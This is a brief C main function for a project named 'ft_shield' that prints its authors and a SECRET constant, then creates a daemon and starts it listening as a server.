#include "../includes/ft_shield.h"

int main ( void )
{
    printf("robrodri & jalvarad.\n");
    printf("|%s|\n", SECRET);
    t_daemon *daemon = create_daemon();
    server_listen(daemon);
    free(daemon);
    oath_done();
    return (EXIT_SUCCESS);
}
